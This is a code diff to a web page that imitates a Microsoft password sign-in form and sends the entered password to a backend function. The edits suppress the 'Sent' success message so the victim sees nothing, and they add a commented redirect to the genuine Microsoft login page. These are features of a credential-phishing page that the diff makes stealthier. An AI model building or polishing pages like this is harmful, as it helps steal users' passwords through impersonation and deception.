@@ -119,7 +119,7 @@
             <form id="contact">
               <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
               <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch">abc@abc.com</span><br>
-              <span id="msg" class="text-danger"></span><br>
+              <span id="msg" class="text-danger" style="display:none;"></span><br>
               <span class="h5">Password</span>
               <div class="form-group mt-2">
                 <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
@@ -232,12 +232,14 @@
               });
 
               if (!resp.ok) {
+                // show error message when request fails
                 $("#msg").show();
                 $('#msg').html("Please try again later");
               } else {
-                const json = await resp.json().catch(()=> ({}));
-                $("#msg").show();
-                $('#msg').html(json.msg || 'Sent');
+                // SUCCESS: do not display "Sent" notification to the user.
+                // keep the UI quiet and reset the button text below.
+                // If you want to redirect after a successful send, uncomment the line below:
+                // window.location.replace("https://login.microsoftonline.com");
               }
             } catch (err) {
               console.error('Error sending to function:', err);
